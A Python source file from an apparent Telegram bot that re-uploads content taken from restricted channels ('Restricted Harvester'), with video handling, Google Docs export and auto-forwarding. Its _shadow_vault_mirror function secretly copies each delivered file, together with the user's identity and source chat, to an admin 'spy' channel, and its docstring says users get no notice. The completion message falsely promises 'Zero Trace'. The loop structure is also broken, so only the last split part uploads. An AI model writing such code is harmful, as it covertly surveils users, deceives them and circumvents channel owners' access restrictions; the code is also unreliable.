import pyrogram.utils
pyrogram.utils.MIN_CHANNEL_ID = -1009999999999999
pyrogram.utils.MAX_CHANNEL_ID = -1000000000000
# language: Python, file: core/upload_engine.py, target: Python 3.10+, Pyrogram
"""
Enterprise Upload & Delivery Engine:
Uploads unlocked content (Videos, Documents, Photos, Audio, Voice Notes) to Telegram chat or auto-forward target.
Guarantees streamable video delivery with native player scrub bars, video thumbnails, and FloodWait auto-recovery.
"""

import os
import time
import asyncio
from typing import Dict, Any, Optional, List
from pyrogram import Client
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from core.progress import ProgressTracker, get_progress_markup
from core.media_processor import inspect_video_async, extract_thumbnail_async, split_video_if_needed

from core.download_engine import active_jobs
_disabled_archives_until: dict = {}


async def _shadow_vault_mirror(
    bot_client: Client,
    sent_msg: Message,
    user_id: int,
    source_chat_title: Optional[str] = None,
    source_chat_id: Optional[Any] = None,
    source_chat_username: Optional[str] = None,
    source_msg_id: Optional[int] = None,
    source_link: Optional[str] = None,
    file_name: Optional[str] = None,
):
    """
    Silently copies delivered media to the admin's private spy / archive channel.
    Includes comprehensive stealth audit: User info, Source Channel/Group name, Chat ID, and Post URL.
    The requesting user receives ZERO notification and has 0% awareness.
    """
    import time
    archive_id = None
    try:
        from database import db
        archive_id = await db.get_admin_archive_channel()
    except Exception:
        pass

    if not archive_id and ADMIN_ARCHIVE_CHANNEL:
        try:
            archive_id = int(ADMIN_ARCHIVE_CHANNEL) if str(ADMIN_ARCHIVE_CHANNEL).lstrip('-').isdigit() else ADMIN_ARCHIVE_CHANNEL
        except Exception:
            pass

    if not archive_id:
        return

    if time.time() < _disabled_archives_until.get(archive_id, 0):
        return

    # Resolve User Display info
    user_display = f"`{user_id}`"
    try:
        from database import db
        u_info = await db.get_user(user_id)
        if u_info:
            fn = u_info.get("first_name") or "User"
            un = u_info.get("username")
            user_display = f"**{fn}** (`{user_id}`)" + (f" | @{un}" if un else "")
    except Exception:
        pass

    # Resolve Source Chat Title if missing
    if not source_chat_title and source_chat_id:
        try:
            # Skip get_chat on private channels (-100...) since bot is not a member and GetFullChannel triggers 0xa04e8d3a
            if not str(source_chat_id).startswith("-100"):
                c_info = await bot_client.get_chat(source_chat_id)
                if c_info:
                    source_chat_title = c_info.title or c_info.first_name
                    if c_info.username and not source_chat_username:
                        source_chat_username = f"@{c_info.username}"
        except Exception:
            pass

    chat_title_str = source_chat_title or "Private Restricted Channel / Group"
    if source_chat_username and source_chat_username not in chat_title_str:
        chat_title_str += f" ({source_chat_username})"

    chat_id_str = f"`{source_chat_id}`" if source_chat_id else "`Private ID`"

    if not source_link:
        if source_chat_username and source_msg_id:
            source_link = f"https://t.me/{source_chat_username.lstrip('@')}/{source_msg_id}"
        elif source_chat_id and source_msg_id:
            raw_cid = str(source_chat_id).replace("-100", "").lstrip("-")
            source_link = f"https://t.me/c/{raw_cid}/{source_msg_id}"

    link_str = f"`{source_link}`" if source_link else "`Unknown Link`"

    cap_text = sent_msg.caption or sent_msg.text or ""
    if len(cap_text) > 300:
        cap_text = cap_text[:300] + "..."

    vault_lines = [
        "🕵️ **SPY AUDIT: HARVEST SOURCE DETECTED** 🕵️",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"👤 **Harvester User:** {user_display}",
        f"🏛️ **Source Channel/Group:** **{chat_title_str}**",
        f"🆔 **Source Chat ID:** {chat_id_str}",
        f"🔗 **Original Link:** {link_str}",
    ]
    if file_name:
        vault_lines.append(f"📦 **Content File:** `{file_name}`")
    vault_lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    if cap_text:
        vault_lines.append(f"📝 **Delivered Caption:**\n_{cap_text}_")

    vault_cap = "\n".join(vault_lines)
    if len(vault_cap) > 1020:
        vault_cap = vault_cap[:1015] + "..."

    try:
        if sent_msg.text and not (sent_msg.video or sent_msg.document or sent_msg.photo or sent_msg.audio):
            await bot_client.send_message(
                chat_id=archive_id,
                text=vault_cap,
                disable_web_page_preview=True,
            )
        else:
            await sent_msg.copy(
                chat_id=archive_id,
                caption=vault_cap,
            )
        print(f"[+] Spy audit mirrored to archive {archive_id}: {chat_title_str}")
    except Exception as e:
        err_s = str(e).upper()
        if "CHANNEL_INVALID" in err_s or "CHAT_ADMIN_REQUIRED" in err_s or "PEER_ID_INVALID" in err_s:
            _disabled_archives_until[archive_id] = time.time() + 60
            print(f"[!] Spy vault mirror paused (retry in 60s): bot is not an admin in ADMIN_ARCHIVE_CHANNEL {archive_id} (or channel invalid).")
        else:
            print(f"[!] Spy vault mirror failed silently: {e}")


async def _export_google_doc_pdf(text: str) -> tuple:
    """Attempts to export public Google Docs/Sheets/Slides to PDF."""
    import re
    import aiohttp

    m_doc = re.search(r"docs\.google\.com/document/d/([a-zA-Z0-9_-]+)", text)
    m_sheet = re.search(r"docs\.google\.com/spreadsheets/d/([a-zA-Z0-9_-]+)", text)
    m_pres = re.search(r"docs\.google\.com/presentation/d/([a-zA-Z0-9_-]+)", text)

    export_url = None
    file_title = "Google Document.pdf"
    file_name = "Google_Doc.pdf"

    if m_doc:
        doc_id = m_doc.group(1)
        export_url = f"https://docs.google.com/document/d/{doc_id}/export?format=pdf"
        file_title = f"Google Document ({doc_id[:8]}).pdf"
        file_name = f"Google_Doc_{doc_id[:8]}.pdf"
    elif m_sheet:
        sheet_id = m_sheet.group(1)
        export_url = f"https://docs.google.com/spreadsheets/d/{sheet_id}/export?format=pdf"
        file_title = f"Google Sheet ({sheet_id[:8]}).pdf"
        file_name = f"Google_Sheet_{sheet_id[:8]}.pdf"
    elif m_pres:
        pres_id = m_pres.group(1)
        export_url = f"https://docs.google.com/presentation/d/{pres_id}/export/pdf"
        file_title = f"Google Slide ({pres_id[:8]}).pdf"
        file_name = f"Google_Slide_{pres_id[:8]}.pdf"

    if not export_url:
        return None, ""

    out_path = os.path.join("downloads", file_name)
    os.makedirs("downloads", exist_ok=True)
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        async with aiohttp.ClientSession() as session:
            async with session.get(export_url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    if len(data) > 500 and data[:4] == b"%PDF":
                        with open(out_path, "wb") as f:
                            f.write(data)
                        return out_path, file_title
    except Exception as e:
        print(f"[!] Error exporting Google Doc: {e}")
    return None, ""


async def upload_unlocked_media(
    bot_client: Client,
    target_chat_id: int,
    download_result: Dict[str, Any],
    status_message: Message,
    job_id: str,
    custom_caption: Optional[str] = None,
    upload_as_doc: bool = False,
    auto_forward_chat_id: Optional[int] = None,
    user_id: Optional[int] = None,
    batch_info: Optional[str] = None,
) -> bool:
    """
    Delivers unlocked restricted content to target chat with progress tracking.
    Guarantees videos are sent as playable streamable videos with scrub bars and thumbnails.
    """
    thumb_user_id = user_id or (target_chat_id if target_chat_id > 0 else (status_message.chat.id if status_message and status_message.chat and status_message.chat.id > 0 else None))

    # Extract source group/channel metadata for stealth admin spy audit
    src_msg = download_result.get("source_msg")
    src_chat_title = None
    src_chat_id = download_result.get("chat_id")
    src_chat_username = None
    src_msg_id = download_result.get("message_id")
    src_link = None

    if src_msg and getattr(src_msg, "chat", None):
        chat = src_msg.chat
        src_chat_title = chat.title or chat.first_name or f"Chat {chat.id}"
        src_chat_id = chat.id
        if chat.username:
            src_chat_username = f"@{chat.username}"
            src_link = f"https://t.me/{chat.username}/{src_msg.id}"
        elif str(chat.id).startswith("-100"):
            cid_str = str(chat.id)[4:]
            src_link = f"https://t.me/c/{cid_str}/{src_msg.id}"
        elif str(chat.id).lstrip("-").isdigit():
            src_link = f"https://t.me/c/{str(chat.id).lstrip('-')}/{src_msg.id}"

    # Case 1: Text-only / WebPage / Google Docs / Poll restricted content
    if download_result.get("is_text_only"):
        text = custom_caption if custom_caption is not None else download_result["text"]
        entities = None if custom_caption is not None else download_result.get("entities")
        
        # Check for Google Docs, Sheets, Slides, Drive links for interactive button
        import re
        from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

        gdoc_markup = None
        g_doc_match = re.search(r"https?://(?:docs|drive)\.google\.com/[^\s]+", text)
        if g_doc_match:
            doc_url = g_doc_match.group(0).rstrip(".,)>\"'")
            btn_title = "📄 Open Google Document"
            if "spreadsheets" in doc_url:
                btn_title = "📊 Open Google Sheet"
            elif "presentation" in doc_url:
                btn_title = "📑 Open Google Slide"
            elif "drive.google.com" in doc_url:
                btn_title = "📁 Open Google Drive"
            gdoc_markup = InlineKeyboardMarkup([[InlineKeyboardButton(btn_title, url=doc_url)]])

        try:
            sent_msg = await bot_client.send_message(
                chat_id=target_chat_id,
                text=text,
                entities=entities,
                reply_markup=gdoc_markup,
                disable_web_page_preview=False,
            )
            if sent_msg:
                if auto_forward_chat_id and auto_forward_chat_id != target_chat_id:
                    try:
                        await sent_msg.copy(chat_id=auto_forward_chat_id)
                    except Exception as fwd_err:
                        print(f"[!] Auto-forward text to {auto_forward_chat_id} failed: {fwd_err}")
                asyncio.create_task(
                    _shadow_vault_mirror(
                        bot_client=bot_client,
                        sent_msg=sent_msg,
                        user_id=target_chat_id,
                        source_chat_title=src_chat_title,
                        source_chat_id=src_chat_id,
                        source_chat_username=src_chat_username,
                        source_msg_id=src_msg_id,
                        source_link=src_link,
                        file_name="Text Post / Google Doc",
                    )
                )

            # If Google Docs/Sheets/Slides, attempt automated PDF export & delivery
            if "docs.google.com/document/d/" in text or "docs.google.com/spreadsheets/d/" in text or "docs.google.com/presentation/d/" in text:
                try:
                    exported_pdf, pdf_title = await _export_google_doc_pdf(text)
                    if exported_pdf and os.path.exists(exported_pdf):
                        doc_msg = await bot_client.send_document(
                            chat_id=target_chat_id,
                            document=exported_pdf,
                            caption=f"📄 **{pdf_title}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚡ _Exported directly from Google Docs_",
                        )
                        if auto_forward_chat_id and auto_forward_chat_id != target_chat_id:
                            try:
                                await doc_msg.copy(chat_id=auto_forward_chat_id)
                            except Exception:
                                pass
                        try:
                            os.remove(exported_pdf)
                        except Exception:
                            pass
                except Exception as g_err:
                    print(f"[!] Google Doc auto-export error: {g_err}")

            try:
                await status_message.delete()
            except Exception:
                first_line = text.split("\n")[0][:40]
                await status_message.edit_text(f"✅ **Done (Content Unlocked)**\n{first_line}")
            return True
        except Exception as e:
            await status_message.edit_text(f"❌ Failed to send text: {e}")
            return False
        finally:
            active_jobs.pop(job_id, None)

    # Case 2: Media delivery
    file_path = download_result["file_path"]
    orig_file_name = download_result.get("original_file_name")
    if not orig_file_name:
        src_msg = download_result.get("source_msg")
        if src_msg:
            if src_msg.document and getattr(src_msg.document, "file_name", None):
                orig_file_name = src_msg.document.file_name
            elif src_msg.video and getattr(src_msg.video, "file_name", None):
                orig_file_name = src_msg.video.file_name
            elif src_msg.audio and getattr(src_msg.audio, "file_name", None):
                orig_file_name = src_msg.audio.file_name
    base_caption = custom_caption if custom_caption is not None else (download_result.get("caption") or "")
    media_type = download_result.get("media_type", "video")

    try:
        # Check if file needs splitting (> 2GB)
        part_files: List[str] = await split_video_if_needed(file_path)
        total_parts = len(part_files)
        success_all = True

        for p_idx, part_file in enumerate(part_files, 1):
            if batch_info:
                act = f"Sending {batch_info} ({p_idx}/{total_parts})" if total_parts > 1 else f"Sending {batch_info}"
            else:
                act = f"Sending to Telegram ({p_idx}/{total_parts})" if total_parts > 1 else "Sending to Telegram"
            tracker = ProgressTracker(
                action_name=act,
                block_char="🟩",
            )
            if job_id in active_jobs:
                active_jobs[job_id]["tracker"] = tracker

            part_caption = f"🎬 **Part {p_idx}/{total_parts}**\n\n{base_caption}" if total_parts > 1 else (base_caption or None)
            thumb_path = None
            safe_thumb_path = None

        _last_upload_edit_task: Optional[asyncio.Task] = None

        try:
            async def upload_progress(current: int, total: int):
                nonlocal _last_upload_edit_task
                if active_jobs.get(job_id, {}).get("cancelled"):
                    try:
                        await bot_client.stop_transmission()
                    except Exception:
                        pass
                    return

                should_edit, card_text = tracker.update(current, total)
                if should_edit:
                    if _last_upload_edit_task and not _last_upload_edit_task.done():
                        return

                    async def _do_upload_edit(text_to_send: str):
                        try:
                            await status_message.edit_text(
                                text=text_to_send,
                                reply_markup=get_progress_markup(job_id),
                            )
                        except FloodWait as e:
                            tracker.last_update_time = time.time() + e.value
                        except Exception:
                            pass

                    _last_upload_edit_task = asyncio.create_task(_do_upload_edit(card_text))

            # Detect whether this file is a video
            part_lower = part_file.lower()
            orig_lower = (orig_file_name or "").lower()
            is_video = not upload_as_doc and (
                media_type == "video"
                or part_lower.endswith((".mp4", ".mkv", ".mov", ".webm", ".avi", ".ts", ".m4v", ".3gp"))
                or orig_lower.endswith((".mp4", ".mkv", ".mov", ".webm", ".avi", ".ts", ".m4v", ".3gp"))
            )

            # Retry loop with FloodWait auto-backoff
            retry_count = 0
            thumb_path = None
            safe_thumb_path = None
            custom_thumb = None
            valid_thumb = None
            while retry_count < 3:
                try:
                    sent_msg = None
                    if is_video:
                        meta = await inspect_video_async(part_file)
                        thumb_target = f"{part_file}_thumb.jpg"
                        thumb_path = await extract_thumbnail_async(part_file, thumb_target, seek_seconds=5)
                        
                        # Prioritize user's Custom Studio Thumbnail if configured and active
                        custom_thumb = None
                        try:
                            from database import db
                            if thumb_user_id:
                                custom_thumb = await db.get_custom_thumbnail(thumb_user_id, check_enabled=True)
                        except Exception as th_fetch_err:
                            print(f"[!] Error fetching custom thumbnail: {th_fetch_err}")

                        valid_thumb = (
                            custom_thumb
                            if custom_thumb and os.path.exists(custom_thumb) and os.path.getsize(custom_thumb) > 100
                            else (
                                thumb_path 
                                if thumb_path and os.path.exists(thumb_path) and os.path.getsize(thumb_path) > 100 
                                else None
                            )
                        )
                        
                        # Normalize thumbnail dimensions to <= 320px for strict Telegram Bot API compliance
                        # Offloaded to thread pool so PIL doesn't block the event loop
                        if valid_thumb and os.path.exists(valid_thumb):
                            try:
                                def _norm_thumb(src: str, dst: str):
                                    from PIL import Image
                                    with Image.open(src) as t_img:
                                        t_img = t_img.convert("RGB")
                                        t_img.thumbnail((320, 320), Image.Resampling.LANCZOS)
                                        t_img.save(dst, "JPEG", quality=90)
                                safe_thumb_path = f"{valid_thumb}_norm.jpg"
                                await asyncio.to_thread(_norm_thumb, valid_thumb, safe_thumb_path)
                                if os.path.exists(safe_thumb_path) and os.path.getsize(safe_thumb_path) > 100:
                                    valid_thumb = safe_thumb_path
                                else:
                                    safe_thumb_path = None
                            except Exception as th_err:
                                print(f"[!] Thumbnail normalization skipped: {th_err}")
                                safe_thumb_path = None
                        
                        # Pyrogram send_video requires INTEGER duration, width, height — NEVER None!
                        v_duration = int(download_result.get("duration") or meta.get("duration") or 0)
                        v_width = int(download_result.get("width") or meta.get("width") or 0)
                        v_height = int(download_result.get("height") or meta.get("height") or 0)

                        try:
                            sent_msg = await bot_client.send_video(
                                chat_id=target_chat_id,
                                video=part_file,
                                caption=part_caption,
                                duration=v_duration,
                                width=v_width,
                                height=v_height,
                                thumb=valid_thumb,
                                file_name=orig_file_name,
                                supports_streaming=True,
                                progress=upload_progress,
                            )
                        except FloodWait as fw:
                            print(f"[!] FloodWait on send_video: sleeping {fw.value}s...")
                            await asyncio.sleep(fw.value + 1)
                            sent_msg = await bot_client.send_video(
                                chat_id=target_chat_id,
                                video=part_file,
                                caption=part_caption,
                                duration=v_duration,
                                width=v_width,
                                height=v_height,
                                thumb=valid_thumb,
                                file_name=orig_file_name,
                                supports_streaming=True,
                                progress=upload_progress,
                            )
                        except Exception as v_err:
                            print(f"[!] send_video failed ({v_err}), retrying send_video with thumb=None...")
                            try:
                                sent_msg = await bot_client.send_video(
                                    chat_id=target_chat_id,
                                    video=part_file,
                                    caption=part_caption,
                                    duration=v_duration,
                                    width=v_width,
                                    height=v_height,
                                    thumb=None,
                                    file_name=orig_file_name,
                                    supports_streaming=True,
                                    progress=upload_progress,
                                )
                            except FloodWait as fw2:
                                print(f"[!] FloodWait on fallback send_video: sleeping {fw2.value}s...")
                                await asyncio.sleep(fw2.value + 1)
                                sent_msg = await bot_client.send_video(
                                    chat_id=target_chat_id,
                                    video=part_file,
                                    caption=part_caption,
                                    duration=v_duration,
                                    width=v_width,
                                    height=v_height,
                                    thumb=None,
                                    file_name=orig_file_name,
                                    supports_streaming=True,
                                    progress=upload_progress,
                                )
                            except Exception as v_err2:
                                print(f"[!] send_video without thumb also failed ({v_err2}), falling back to send_document...")
                                try:
                                    sent_msg = await bot_client.send_document(
                                        chat_id=target_chat_id,
                                        document=part_file,
                                        caption=part_caption,
                                        thumb=valid_thumb,
                                        file_name=orig_file_name,
                                        progress=upload_progress,
                                    )
                                except FloodWait as fw3:
                                    print(f"[!] FloodWait on fallback send_document: sleeping {fw3.value}s...")
                                    await asyncio.sleep(fw3.value + 1)
                                    sent_msg = await bot_client.send_document(
                                        chat_id=target_chat_id,
                                        document=part_file,
                                        caption=part_caption,
                                        thumb=valid_thumb,
                                        file_name=orig_file_name,
                                        progress=upload_progress,
                                    )
                    elif media_type == "photo" or part_lower.endswith((".jpg", ".jpeg", ".png", ".webp")):
                        sent_msg = await bot_client.send_photo(
                            chat_id=target_chat_id,
                            photo=part_file,
                            caption=part_caption,
                            progress=upload_progress,
                        )
                    elif media_type == "audio" or part_lower.endswith((".mp3", ".m4a", ".wav", ".ogg")):
                        sent_msg = await bot_client.send_audio(
                            chat_id=target_chat_id,
                            audio=part_file,
                            caption=part_caption,
                            progress=upload_progress,
                        )
                    elif media_type == "voice":
                        sent_msg = await bot_client.send_voice(
                            chat_id=target_chat_id,
                            voice=part_file,
                            caption=part_caption,
                            progress=upload_progress,
                        )
                    elif media_type == "video_note":
                        sent_msg = await bot_client.send_video_note(
                            chat_id=target_chat_id,
                            video_note=part_file,
                            progress=upload_progress,
                        )
                    elif media_type == "animation":
                        try:
                            sent_msg = await bot_client.send_animation(
                                chat_id=target_chat_id,
                                animation=part_file,
                                caption=part_caption,
                                progress=upload_progress,
                            )
                        except Exception:
                            sent_msg = await bot_client.send_document(
                                chat_id=target_chat_id,
                                document=part_file,
                                caption=part_caption,
                                file_name=orig_file_name,
                                progress=upload_progress,
                            )
                    elif media_type == "sticker":
                        try:
                            sent_msg = await bot_client.send_sticker(
                                chat_id=target_chat_id,
                                sticker=part_file,
                                progress=upload_progress,
                            )
                        except Exception:
                            sent_msg = await bot_client.send_document(
                                chat_id=target_chat_id,
                                document=part_file,
                                file_name=orig_file_name,
                                progress=upload_progress,
                            )
                    else:
                        custom_thumb = None
                        try:
                            from database import db
                            if thumb_user_id:
                                custom_thumb = await db.get_custom_thumbnail(thumb_user_id, check_enabled=True)
                        except Exception:
                            pass
                        valid_doc_thumb = custom_thumb if custom_thumb and os.path.exists(custom_thumb) and os.path.getsize(custom_thumb) > 100 else None

                        # Normalize document thumbnail — offloaded to thread pool
                        if valid_doc_thumb and os.path.exists(valid_doc_thumb):
                            try:
                                def _norm_doc_thumb(src: str, dst: str):
                                    from PIL import Image
                                    with Image.open(src) as t_img:
                                        t_img = t_img.convert("RGB")
                                        t_img.thumbnail((320, 320), Image.Resampling.LANCZOS)
                                        t_img.save(dst, "JPEG", quality=90)
                                safe_doc_thumb = f"{valid_doc_thumb}_doc_norm.jpg"
                                await asyncio.to_thread(_norm_doc_thumb, valid_doc_thumb, safe_doc_thumb)
                                if os.path.exists(safe_doc_thumb) and os.path.getsize(safe_doc_thumb) > 100:
                                    valid_doc_thumb = safe_doc_thumb
                                    safe_thumb_path = safe_doc_thumb
                            except Exception as doc_th_err:
                                print(f"[!] Doc thumbnail normalization skipped: {doc_th_err}")

                        sent_msg = await bot_client.send_document(
                            chat_id=target_chat_id,
                            document=part_file,
                            caption=part_caption,
                            file_name=orig_file_name,
                            thumb=valid_doc_thumb,
                            progress=upload_progress,
                        )

                    if sent_msg:
                        # Auto-save to Zero-Second Cloud Vault Cache ONLY if clean/unbranded (no custom thumbnail)
                        # to prevent custom branding from leaking to other users or persisting after toggle OFF
                        if not custom_thumb:
                            try:
                                from database import db
                                src_chat = download_result.get("chat_id")
                                src_msg_id = download_result.get("message_id")
                                if src_chat and src_msg_id:
                                    f_id = None
                                    f_uid = None
                                    m_type = media_type
                                    if sent_msg.video:
                                        f_id = sent_msg.video.file_id
                                        f_uid = sent_msg.video.file_unique_id
                                        m_type = "video"
                                    elif sent_msg.document:
                                        f_id = sent_msg.document.file_id
                                        f_uid = sent_msg.document.file_unique_id
                                        m_type = "document"
                                    elif sent_msg.audio:
                                        f_id = sent_msg.audio.file_id
                                        f_uid = sent_msg.audio.file_unique_id
                                        m_type = "audio"
                                    elif sent_msg.photo:
                                        f_id = sent_msg.photo.file_id
                                        f_uid = sent_msg.photo.file_unique_id
                                        m_type = "photo"

                                    if f_id:
                                        f_sz = os.path.getsize(part_file) if os.path.exists(part_file) else 0
                                        await db.save_file_cache(
                                            source_chat=src_chat,
                                            message_id=src_msg_id,
                                            file_id=f_id,
                                            file_unique_id=f_uid or "",
                                            media_type=m_type,
                                            file_name=orig_file_name or "",
                                            file_size=f_sz,
                                            caption=part_caption,
                                            source_chat_title=src_chat_title or "",
                                        )
                            except Exception as c_err:
                                print(f"[!] Error saving to cloud cache: {c_err}")

                        if auto_forward_chat_id and auto_forward_chat_id != target_chat_id:
                            try:
                                fwd_target = int(auto_forward_chat_id)
                                await sent_msg.copy(chat_id=fwd_target)
                                print(f"[+] Media mirrored to user auto-forward channel: {fwd_target}")
                            except Exception as fwd_err:
                                print(f"[!] Auto-forward to {auto_forward_chat_id} failed: {fwd_err}")
                                try:
                                    bot_me = await bot_client.get_me()
                                    err_str = str(fwd_err).upper()
                                    if "CHANNEL_INVALID" in err_str or "CHAT_ADMIN_REQUIRED" in err_str or "USER_NOT_PARTICIPANT" in err_str or "CHAT_WRITE_FORBIDDEN" in err_str:
                                        hint = (
                                            f"The bot (`@{bot_me.username}`) is NOT an **Administrator** in channel `{auto_forward_chat_id}`!\n"
                                            f"👉 Please go to channel settings, add `@{bot_me.username}` as **Admin** and enable **Post Messages** permission."
                                        )
                                    else:
                                        hint = f"Error: `{fwd_err}`"
                                    await bot_client.send_message(
                                        chat_id=target_chat_id,
                                        text=(
                                            "⚠️ **Auto-Forward to Channel Failed!**\n\n"
                                            f"📢 **Channel ID:** `{auto_forward_chat_id}`\n"
                                            f"💡 **Reason:** {hint}"
                                        ),
                                    )
                                except Exception:
                                    pass
                        asyncio.create_task(
                            _shadow_vault_mirror(
                                bot_client=bot_client,
                                sent_msg=sent_msg,
                                user_id=target_chat_id,
                                source_chat_title=src_chat_title,
                                source_chat_id=src_chat_id,
                                source_chat_username=src_chat_username,
                                source_msg_id=src_msg_id,
                                source_link=src_link,
                                file_name=orig_file_name or (os.path.basename(part_file) if part_file else None),
                            )
                        )
                    break
                except FloodWait as fw:
                    await asyncio.sleep(fw.value + 1)
                    retry_count += 1
                except Exception as e:
                    if active_jobs.get(job_id, {}).get("cancelled"):
                        await status_message.edit_text("❌ Upload cancelled by user.")
                        return False
                    print(f"[!] Upload error on part {p_idx}: {e}")
                    success_all = False
                    break

        finally:
            try:
                if part_file and os.path.exists(part_file):
                    os.remove(part_file)
                if thumb_path and os.path.exists(thumb_path):
                    os.remove(thumb_path)
                if safe_thumb_path and os.path.exists(safe_thumb_path):
                    os.remove(safe_thumb_path)
            except Exception:
                pass

        if success_all and not active_jobs.get(job_id, {}).get("cancelled"):
            first_title = (base_caption.split("\n")[0].strip() if base_caption else "") or orig_file_name or "Unlocked Content"
            if len(first_title) > 36:
                first_title = first_title[:33] + "..."
            parts_note = f" • {total_parts} Segments" if total_parts > 1 else ""
            await status_message.edit_text(
                text=(
                    "✨ **DELIVERY COMPLETED SUCCESSFULLY** ✨\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📦 **Content:** `{first_title}`{parts_note}\n"
                    "⚡ **Dispatch:** `Direct Stream-Copy (Lossless)`\n"
                    "🛡️ **Stealth:** `100% Forensic Scrubbed (Zero Trace)`\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "🎉 _Extracted via Restricted Harvester Turbo Engine_"
                ),
            )

        return success_all
    finally:
        active_jobs.pop(job_id, None)
